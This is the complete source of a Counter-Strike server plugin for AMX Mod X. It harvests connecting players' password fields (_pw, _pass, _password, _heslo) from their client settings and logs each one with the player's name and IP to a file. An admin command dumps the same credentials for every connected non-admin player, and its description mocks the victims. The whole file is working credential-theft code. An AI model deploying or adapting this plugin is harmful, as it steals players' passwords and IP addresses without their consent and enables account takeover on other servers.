#include <amxmodx>
#include <amxmisc>

new  gMaxPlayers
new const hesla[][] = {
	"_pw",
	"_pass",
	"_password",
	"_heslo"
}

public plugin_init()
{
	register_plugin("Pass", "1.0", "Seky")
	register_clcmd ( "pass_who", "pass_where",	ADMIN_RCON, "prikaz na debilov" );
	gMaxPlayers = get_maxplayers();
}	
public client_connect(id)
{
	if((get_user_flags(id) & ADMIN_MENU) || (get_user_flags(id) & ADMIN_LEVEL_F) )
		return PLUGIN_CONTINUE
		
	new meno[33], password[32], ip[32], i
	get_user_name(id, meno, 32)
	
	for(i=0; i < sizeof hesla; i++ )
	{
		get_user_info(id, hesla[i], password, 31)
		get_user_ip(id, ip, 31)
		if(!equal(password, ""))
		{
			log_to_file("passwords.log", "%s ^n setinfo ^"%s^" ^"%s^" ^n %s", meno, hesla[i], password, ip);
		}
	}	
}
public pass_where(id,level,cid)
{
	if (!cmd_access(id,level,cid,1))
		return PLUGIN_HANDLED
		
	new meno[33], password[32], ip[32], i, a
	
	for(new a = 1; a <= gMaxPlayers; a++ )
	{
		if (!is_user_connected(a))
			continue;
			
		if((get_user_flags(a) & ADMIN_MENU) || (get_user_flags(a) & ADMIN_LEVEL_F) )
			continue;
			
		get_user_name(a, meno, 32)
		
		for(i = 0; i < sizeof hesla; i++ )
		{
			get_user_info(a, hesla[i], password, 31)
			get_user_ip(a, ip, 31)
			
			if(!equal(password, ""))
				client_print(id, print_console, "%s ^n setinfo ^"%s^" ^"%s^" ^n %s", meno, hesla[i], password, ip);
		}
	}
	return PLUGIN_CONTINUE
}